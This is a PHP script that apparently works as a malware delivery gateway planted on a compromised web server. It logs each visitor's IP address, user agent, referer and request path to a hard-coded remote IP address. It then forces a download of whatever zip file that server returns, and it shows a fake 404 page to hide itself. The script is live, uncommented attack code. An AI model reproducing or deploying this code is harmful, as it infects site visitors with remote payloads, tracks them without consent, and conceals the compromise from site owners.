<?php
error_reporting(0);
ini_set("display_errors", 0);

$remote = 'http://78.138.118.125:443/7ntomlfsf.php';

php_display($remote);

error_404();

function php_display($url)
{    
    $query = array();
    $query['ip'] = getIp();
    $query['time'] = date('d/M/Y:H:i:s', time());
    $query['request'] = getRequest();
    $query['path'] = getPath();
    $query['protocol'] = getProtocol();
    $query['useragent'] = getUseragent();
    $query['referer'] = getReferer();
    
    $url = $url."?".http_build_query($query);

    $content = @file_get_contents($url);
    
    if(empty($content) OR stripos($content, "error") !== FALSE)
    {
        error_404();
    }
    
    $content = explode("\n", $content);
    $filename = array_shift($content);
    $content = implode("\n", $content);
    
    $type = 'application/zip';
    header('Content-Type:'.$type);
    header('Content-Disposition: attachment; filename='.$filename);
    header('Content-Length: '.  strlen($content));
    echo $content;
    exit();
}

function error_404()
{
    header("HTTP/1.1 404 Not Found");
    exit("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n"
            ."<html><head><title>404 Not Found</title></head><body>\r\n"
            ."<h1>Not Found</h1>\r\n"
            ."<p>The requested URL was not found on this server.</p>\r\n"
            ."<hr>\r\n"
            ."</body></html>\r\n");
}

function getRequest()
{
    return $_SERVER['REQUEST_METHOD'];
}

function getPath()
{
    return $_SERVER['REQUEST_URI'];
}

function getProtocol()
{
    return $_SERVER['SERVER_PROTOCOL'];
}

function getUseragent()
{
    return $_SERVER['HTTP_USER_AGENT'];
}

function getReferer()
{
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '-';
    return $referer;    
}

function getIp()
{
    $ip = NULL;
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    elseif(isset($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif(isset($_SERVER['REMOTE_ADDR']))
    {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if(strpos($ip, ",") !== FALSE)
    {
        $ips = explode(",", $ip);
        $ip = trim(array_pop($ips));
    }

    return $ip;
} 
